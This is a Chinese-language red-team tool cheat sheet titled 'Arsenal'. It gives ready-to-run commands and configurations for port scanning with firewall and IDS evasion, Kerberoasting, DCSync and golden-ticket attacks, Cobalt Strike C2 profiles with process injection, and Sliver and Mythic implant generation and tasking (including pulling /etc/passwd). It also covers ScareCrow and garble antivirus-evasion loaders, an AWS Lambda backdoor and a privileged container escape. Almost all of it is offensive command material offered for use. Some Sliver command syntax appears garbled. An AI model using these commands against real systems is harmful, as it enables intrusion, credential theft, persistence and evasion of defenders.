# 常用工具库 (Arsenal)

## 扫描工具

### Nmap

#### 基础扫描
```bash
# 基础端口扫描
nmap -sS -p- -T4 target.com                    # SYN扫描所有端口
nmap -sV -sC -O target.com                     # 服务版本检测 + 默认脚本 + OS检测
nmap -sU --top-ports 1000 target.com          # UDP扫描前1000端口
nmap -sS -p 80,443,8080,8443 target.com       # 特定端口扫描

# 快速扫描
nmap -F target.com                             # 快速扫描（前100端口）
nmap --top-ports 100 target.com               # 扫描前100端口
nmap -sS -T5 --max-retries 1 --max-scan-delay 0 target.com  # 极速扫描
```

#### 高级扫描
```bash
# 绕过防火墙
nmap -f target.com                            # 分段数据包
nmap --mtu 16 target.com                      # 设置MTU
nmap -D RND:10 target.com                     # 诱饵扫描
nmap --source-port 53 target.com              # 源端口欺骗
nmap --data-length 25 target.com              # 添加随机数据

# IDS/IPS绕过
nmap --ttl 128 target.com                     # 设置TTL
nmap --badsum target.com                      # 错误校验和
nmap --scan-delay 1s target.com               # 扫描延迟
nmap --max-parallelism 1 target.com           # 限制并行度

# 输出格式
nmap -oA scan_results target.com              # 所有格式输出
nmap -oX scan_results.xml target.com          # XML输出
nmap -oG scan_results.gnmap target.com        # Grepable输出
nmap -oS scan_results.nmap target.com         # 脚本 kiddie输出
```

#### 脚本扫描
```bash
# 默认脚本扫描
nmap -sC target.com                            # 默认脚本
nmap --script default target.com               # 默认脚本

# 特定脚本
nmap --script vuln target.com                  # 漏洞扫描
nmap --script exploit target.com               # 利用脚本
nmap --script auth target.com                  # 认证脚本
nmap --script discovery target.com             # 发现脚本
nmap --script safe target.com                  # 安全脚本

# 脚本类别
nmap --script "http-*" target.com              # HTTP相关脚本
nmap --script "smb-*" target.com               # SMB相关脚本
nmap --script "ssl-*" target.com               # SSL相关脚本
nmap --script "dns-*" target.com               # DNS相关脚本

# 自定义脚本参数
nmap --script http-enum --script-args http-enum.basepath=/admin target.com
nmap --script smb-vuln-ms17-010 target.com    # MS17-010检测
```

### Masscan

#### 大规模端口扫描
```bash
# 基本使用
masscan 192.168.1.0/24 -p1-65535 --rate 1000    # 扫描整个子网
masscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt  # 扫描互联网
masscan 10.0.0.0/8 -p80,443,8080 --rate 10000  # 快速扫描常用端口

# 高级选项
masscan 192.168.1.0/24 -p1-65535 --rate 1000 --output-format xml
masscan 192.168.1.0/24 -p1-65535 --rate 1000 --output-filename results.xml
masscan 192.168.1.0/24 -p445 --rate 1000000 --banners  # 获取banner
masscan 192.168.1.0/24 -p445 --rate 1000000 --heartbleed  # Heartbleed检测
```

### Nuclei

#### 模板扫描
```bash
# 基础扫描
nuclei -u target.com                            # 基础扫描
nuclei -u target.com -t cves/                   # CVE扫描
nuclei -u target.com -t exposures/              # 信息泄露扫描
nuclei -u target.com -t misconfiguration/       # 配置错误扫描

# 高级扫描
nuclei -u target.com -tags cve                  # CVE标签
nuclei -u target.com -tags xss                  # XSS标签
nuclei -u target.com -tags sqli                 # SQL注入标签
nuclei -u target.com -tags rce                  # RCE标签

# 自定义模板
nuclei -u target.com -t custom-templates/       # 自定义模板
nuclei -u target.com -w workflows/              # 工作流扫描
nuclei -u target.com -severity critical,high    # 严重级别
```

## Web工具

### Burp Suite

#### 基础配置
```python
# burp_extensions.py
from burp import IBurpExtender, IHttpListener, IScanIssue
import json

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("RedTeam Helper")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # 自动添加头部
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(request)
            headers = analyzedRequest.getHeaders()
            
            # 添加自定义头部
            headers.add("X-Forwarded-For: 192.168.1.100")
            headers.add("User-Agent: Mozilla/5.0 RedTeam")
            
            # 重建请求
            body = request[analyzedRequest.getBodyOffset():]
            newRequest = self._helpers.buildHttpMessage(headers, body)
            messageInfo.setRequest(newRequest)
```

#### 自动化脚本
```bash
# Burp CLI自动化
java -jar burp-rest-api.jar --headless.mode=true --port=8090

# 使用REST API
curl -X POST "http://localhost:8090/v1/scan/active" \\
  -H "Content-Type: application/json" \\
  -d '{"urls": ["http://target.com"]}'

# 获取扫描结果
curl "http://localhost:8090/v1/scan/report?id=123"
```

### Yakit

#### 基础使用
```bash
# Yakit命令行使用
yakit -t target.com                            # 基础扫描
yakit -t target.com --plugin xss               # XSS插件
yakit -t target.com --plugin sqli              # SQL注入插件
yakit -t target.com --plugin rce               # RCE插件

# 高级扫描
yakit -t target.com --fuzz dict.txt            # Fuzz测试
yakit -t target.com --brute user.txt pass.txt  # 暴力破解
yakit -t target.com --spider                   # 爬虫
```

## AD工具

### Impacket

#### 基础AD操作
```bash
# 获取域信息
enum4linux -a target.com                      # 完整枚举
ldapdomaindump -u domain\\user -p password target.com  # LDAP枚举
adidnsdump -u domain\\user -p password target.com     # DNS枚举

# Kerberos攻击
GetNPUsers.py domain/user -dc-ip target.com   # AS-REP Roasting
GetUserSPNs.py domain/user -dc-ip target.com  # Kerberoasting
secretsdump.py domain/user@target.com         # DCSync

# 横向移动
psexec.py domain/admin@target.com             # PSExec
wmiexec.py domain/admin@target.com            # WMI执行
smbexec.py domain/admin@target.com            # SMB执行
dcomexec.py domain/admin@target.com           # DCOM执行
```

#### 高级AD利用
```bash
# BloodHound数据收集
bloodhound-python -u user -p password -d domain -c all -ns target.com

# Certipy证书攻击
certipy find -u user -p password -target target.com
certipy req -u user -p password -target target.com -ca CA-NAME
certipy auth -pfx user.pfx -username user -domain domain -target target.com

# LAPS密码获取
Get-LAPSPasswords.py domain/user -dc-ip target.com
```

### Rubeus

#### Kerberos操作
```powershell
# Rubeus基础命令
Rubeus.exe kerberoast                        # Kerberoasting
Rubeus.exe asreproast                        # AS-REP Roasting
Rubeus.exe harvest /interval:30              # 票据收集

# 票据操作
Rubeus.exe asktgt /user:admin /password:Password123! /domain:corp.local
Rubeus.exe asktgs /ticket:admin.kirbi /service:HTTP/web.corp.local
Rubeus.exe ptt /ticket:admin.kirbi           # Pass-the-Ticket
Rubeus.exe purge                             # 清除票据

# Golden Ticket
Rubeus.exe golden /tgtdeleg /domain:corp.local /sid:S-1-5-21-xxx /rc4:hash
```

## C2框架

### Cobalt Strike

#### 基础配置
```
# Malleable C2 Profile
set sample_name "RedTeam-Profile";
set sleeptime "3000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

# HTTP GET
http-get {
    set uri "/api/v1/news /api/v1/updates /api/v1/status";
    client {
        header "Accept" "application/json";
        header "X-Forwarded-For" "8.8.8.8";
        
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend '{"status":"ok","data":';
            append '}';
            print;
        }
    }
}

# HTTP POST
http-post {
    set uri "/api/v1/submit /api/v1/upload /api/v1/push";
    client {
        id {
            base64url;
            parameter "id";
        }
        
        output {
            base64;
            prepend '{"action":"report","content":';
            append '}';
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend '{"response":"success","result":';
            append '}';
            print;
        }
    }
}
```

#### 高级功能
```
# 进程注入
process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "true";
    set userwx   "false";
    
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "";
    }
    
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        SetThreadContext;
        CreateRemoteThread "ntdll!RtlUserThreadStart";
        RtlCreateUserThread;
    }
}

# 内存指示器
stage {
    set compile_time "19 May 2021 12:34:56";
    set userwx       "false";
    set stomppe      "true";
    set obfuscate    "true";
    set name         "RedTeam DLL";
    
    transform-x86 {
        strrep "beacon.dll" "";
        strrep "beacon.x64.dll" "";
    }
}
```

### Sliver

#### 基础使用
```bash
# Sliver服务器启动
sliver-server

# 生成监听器
sliver > https -l 443 -d cdn.cloudflare.com
sliver > mtls -l 443
sliver > dns -d tunnel.example.com

# 生成植入物
sliver > generate --mtls cdn.cloudflare.com --os windows
sliver > generate --https cdn.cloudflare.com --os linux
sliver > generate --dns tunnel.example.com --arch amd64

# 会话管理
sliver > sessions
sliver > use [session_id]
sliver > interact [session_id]
```

#### 高级功能
```bash
# 进程注入
sliver > procdump [pid]
sliver > migrate [pid]
sliver > execute -b calc.exe

# 权限提升
sliver > getsystem
sliver > runas /user:administrator /password:password cmd.exe

# 横向移动
sliver > psexec /target:192.168.1.10 /user:administrator /password:password
sliver > wmiexec /target:192.168.1.10 /user:administrator /password:password
```

### Mythic

#### 基础操作
```bash
# Mythic启动
sudo ./mythic-cli start

# 创建Payload
mythic > payload create
  - Payload Type: apollo
  - C2 Profile: http
  - Command: whoami

# 任务执行
mythic > task create [callback_id] whoami
mythic > task create [callback_id] ls
mythic > task create [callback_id] download /etc/passwd
```

## 免杀工具

### ScareCrow

#### 基础使用
```bash
# 生成Loader
ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com
ScareCrow -I payload.bin -Loader control -domain www.google.com
ScareCrow -I payload.bin -Loader dll -domain www.cloudflare.com

# 高级选项
ScareCrow -I payload.bin -Loader binary -domain www.microsoft.com -sandbox -injection VirtualAllocEx
ScareCrow -I payload.bin -Loader control -domain www.google.com -encryption -etw
ScareCrow -I payload.bin -Loader dll -domain www.cloudflare.com -unmodified -delivery httploader
```

### Go-Bypass

#### 编译器混淆
```bash
# 基础混淆
go build -ldflags="-s -w -X main.version=1.0" -o loader.exe main.go
garble -literals -tiny -seed=random build -o loader.exe main.go

# 高级混淆
garble -literals -tiny -seed=$(date +%s) build -ldflags="-s -w -H=windowsgui" -o loader.exe main.go
```

#### 代码混淆
```go
// 字符串混淆
package main

import (
    "fmt"
    "strings"
)

func main() {
    // 动态字符串构建
    parts := []string{"Ne", "w-O", "bje", "ct"}
    result := strings.Join(parts, "")
    fmt.Println(result)
}

// API动态解析
func dynamicAPI() {
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    
    virtualAlloc.Call(0, 1024, 0x1000, 0x40)
}
```

## 云工具

### AWS CLI

#### 基础操作
```bash
# 配置
aws configure
aws sts get-caller-identity

# EC2操作
aws ec2 describe-instances --region us-west-2
aws ec2 describe-security-groups --region us-west-2
aws ec2 describe-key-pairs --region us-west-2

# IAM操作
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local

# S3操作
aws s3 ls
aws s3 ls s3://bucket-name
aws s3 cp local-file s3://bucket-name/path/
```

#### 高级利用
```bash
# 权限枚举
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/test-user \
  --action-names s3:GetObject ec2:DescribeInstances

# 角色枚举
aws iam get-role --role-name role-name
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/role-name \
  --role-session-name RedTeamSession

# Lambda后门
aws lambda create-function \
  --function-name security-monitor \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/lambda-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip
```

### Azure CLI

#### 基础操作
```bash
# 登录
az login
az account show

# VM操作
az vm list
az vm show --name vm-name --resource-group rg-name
az vm run-command invoke --command-id RunShellScript --name vm-name

# IAM操作
az role assignment list
az ad user list
az ad group list

# Key Vault操作
az keyvault list
az keyvault secret list --vault-name vault-name
az keyvault key list --vault-name vault-name
```

## 容器工具

### Docker

#### 容器逃逸
```bash
# 检查容器权限
docker run --rm -v /:/host alpine chroot /host

# 特权容器逃逸
docker run --privileged -v /:/host alpine \
  chroot /host bash -c "echo 'redteam' > /tmp/backdoor.sh"

# Docker Socket利用
curl --unix-socket /var/run/docker.sock \
  http://localhost/containers/json
```

#### Kubernetes工具
```bash
# kubectl基础
kubectl get pods
kubectl get services
kubectl get secrets
kubectl get configmaps

# 权限检查
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# 横向移动
kubectl exec -it pod-name -- /bin/bash
kubectl create -f malicious-pod.yaml
kubectl port-forward pod-name 8080:80
```

## 自动化脚本

### 工具安装脚本
```bash
#!/bin/bash
# redteam_tools_install.sh

echo "[*] Installing RedTeam tools..."

# 创建工具目录
mkdir -p /opt/redteam/{scanners,web,ad,exploitation,persistence}

# 安装扫描工具
echo "[*] Installing scanning tools..."
git clone https://github.com/nmap/nmap.git /opt/redteam/scanners/nmap
git clone https://github.com/robertdavidgraham/masscan.git /opt/redteam/scanners/masscan
git clone https://github.com/projectdiscovery/nuclei-templates.git /opt/redteam/scanners/nuclei-templates

# 安装Web工具
echo "[*] Installing web tools..."
git clone https://github.com/sqlmapproject/sqlmap.git /opt/redteam/web/sqlmap
git clone https://github.com/wireshark/wireshark.git /opt/redteam/web/wireshark

# 安装AD工具
echo "[*] Installing AD tools..."
git clone https://github.com/SecureAuthCorp/impacket.git /opt/redteam/ad/impacket
git clone https://github.com/BloodHoundAD/BloodHound.git /opt/redteam/ad/bloodhound

# 安装利用工具
echo "[*] Installing exploitation tools..."
git clone https://github.com/gentilkiwi/mimikatz.git /opt/redteam/exploitation/mimikatz
git clone https://github.com/Cobalt-Strike/Malleable-C2-Profiles.git /opt/redteam/exploitation/c2-profiles

# 安装持久化工具
echo "[*] Installing persistence tools..."
git clone https://github.com/BC-SECURITY/Empire.git /opt/redteam/persistence/empire

# 设置权限
chmod +x /opt/redteam/*/*
echo "[+] RedTeam tools installation completed!"
```

### 自动化扫描脚本
```python
#!/usr/bin/env python3
# automated_scanner.py

import subprocess
import json
import datetime
import os

class AutomatedScanner:
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.timestamp = datetime.datetime.now().isoformat()
    
    def run_nmap_scan(self):
        """运行Nmap扫描"""
        print(f"[*] Running Nmap scan on {self.target}")
        
        cmd = f"nmap -sS -sV -sC -O -oX nmap_{self.target}.xml {self.target}"
        subprocess.run(cmd, shell=True, capture_output=True)
        
        self.results['nmap'] = {
            'command': cmd,
            'output_file': f"nmap_{self.target}.xml",
            'timestamp': self.timestamp
        }
    
    def run_nuclei_scan(self):
        """运行Nuclei扫描"""
        print(f"[*] Running Nuclei scan on {self.target}")
        
        cmd = f"nuclei -u http://{self.target} -o nuclei_{self.target}.txt"
        subprocess.run(cmd, shell=True, capture_output=True)
        
        self.results['nuclei'] = {
            'command': cmd,
            'output_file': f"nuclei_{self.target}.txt",
            'timestamp': self.timestamp
        }
    
    def run_dirsearch(self):
        """运行目录扫描"""
        print(f"[*] Running Dirsearch on {self.target}")
        
        cmd = f"dirsearch -u http://{self.target} -o dirsearch_{self.target}.txt"
        subprocess.run(cmd, shell=True, capture_output=True)
        
        self.results['dirsearch'] = {
            'command': cmd,
            'output_file': f"dirsearch_{self.target}.txt",
            'timestamp': self.timestamp
        }
    
    def generate_report(self):
        """生成扫描报告"""
        report = {
            'target': self.target,
            'timestamp': self.timestamp,
            'results': self.results,
            'summary': {
                'total_scans': len(self.results),
                'successful_scans': len([r for r in self.results.values() if os.path.exists(r['output_file'])])
            }
        }
        
        with open(f'scan_report_{self.target}.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Scan report generated: scan_report_{self.target}.json")
    
    def run_all_scans(self):
        """运行所有扫描"""
        self.run_nmap_scan()
        self.run_nuclei_scan()
        self.run_dirsearch()
        self.generate_report()

# 使用示例
if __name__ == "__main__":
    scanner = AutomatedScanner("target.com")
    scanner.run_all_scans()
```

---

## 工具分类速查表

### 按功能分类

| 功能类别    | 工具名称          | 主要用途         | 推荐指数  |
| ------- | ------------- | ------------ | ----- |
| **扫描**  | Nmap          | 端口扫描/服务发现    | ⭐⭐⭐⭐⭐ |
|         | Masscan       | 大规模端口扫描      | ⭐⭐⭐⭐  |
|         | Nuclei        | 模板化漏洞扫描      | ⭐⭐⭐⭐⭐ |
| **Web** | Burp Suite    | Web应用测试      | ⭐⭐⭐⭐⭐ |
|         | Yakit         | 国产Web测试工具    | ⭐⭐⭐⭐  |
|         | SQLMap        | SQL注入测试      | ⭐⭐⭐⭐⭐ |
| **AD**  | Impacket      | AD协议实现       | ⭐⭐⭐⭐⭐ |
|         | BloodHound    | AD可视化分析      | ⭐⭐⭐⭐⭐ |
|         | Rubeus        | Kerberos攻击   | ⭐⭐⭐⭐⭐ |
| **C2**  | Cobalt Strike | 商业C2框架       | ⭐⭐⭐⭐⭐ |
|         | Sliver        | 开源C2框架       | ⭐⭐⭐⭐⭐ |
|         | Mythic        | 模块化C2框架      | ⭐⭐⭐⭐  |
| **免杀**  | ScareCrow     | Loader生成     | ⭐⭐⭐⭐  |
|         | Garble        | Go代码混淆       | ⭐⭐⭐⭐  |
| **云**   | AWS CLI       | AWS操作        | ⭐⭐⭐⭐⭐ |
|         | Azure CLI     | Azure操作      | ⭐⭐⭐⭐  |
|         | kubectl       | Kubernetes操作 | ⭐⭐⭐⭐  |

### 按操作系统分类

#### Windows工具
```batch
# 系统内置工具
net user                                    # 用户管理
net localgroup                              # 组管理
netstat -ano                                # 网络连接
tasklist                                    # 进程列表
systeminfo                                  # 系统信息
reg query                                   # 注册表查询
sc query                                    # 服务查询
wmic process list                           # WMI进程查询

# PowerShell工具
Get-Process                                 # 获取进程
Get-Service                                 # 获取服务
Get-WmiObject Win32_Process                 # WMI进程
Get-NetTCPConnection                        # 网络连接
Get-LocalUser                              # 本地用户
Get-LocalGroup                             # 本地组
```

#### Linux工具
```bash
# 系统信息
uname -a                                    # 内核信息
cat /etc/os-release                         # 发行版信息
lsb_release -a                             # 详细发行版信息
uptime                                      # 系统运行时间

# 网络工具
netstat -tulnp                              # 网络连接
ss -tulnp                                   # 现代网络工具
lsof -i                                     # 打开的网络文件
iptables -L                                # 防火墙规则

# 进程工具
ps aux                                      # 进程列表
top                                        # 动态进程查看
htop                                       # 增强版top
pidof process_name                          # 进程PID

# 用户管理
id                                          # 用户ID信息
whoami                                      # 当前用户
w                                           # 登录用户
last                                        # 登录历史
```

#### macOS工具
```bash
# 系统信息
system_profiler                             # 详细系统信息
sw_vers                                     # 系统版本
uname -a                                    # 内核信息

# 网络工具
netstat -an                                 # 网络连接
lsof -i                                     # 打开的网络文件
scutil --dns                               # DNS配置

# 进程工具
ps aux                                      # 进程列表
top                                        # 动态进程查看
pgrep process_name                          # 进程搜索

# 用户管理
dscl . -list /Users                         # 用户列表
id                                          # 用户ID信息
whoami                                      # 当前用户
```

---

## 实战检查清单

### 工具准备
- [ ] 扫描工具已安装
- [ ] Web工具已配置
- [ ] AD工具已准备
- [ ] C2框架已部署
- [ ] 免杀工具已编译

### 工具配置
- [ ] 扫描参数已优化
- [ ] API密钥已配置
- [ ] 网络连接已测试
- [ ] 输出格式已设置
- [ ] 自动化脚本已准备

### 工具使用
- [ ] 基础功能已掌握
- [ ] 高级功能已学习
- [ ] 绕过技术已了解
- [ ] 输出结果已分析
- [ ] 工具组合已测试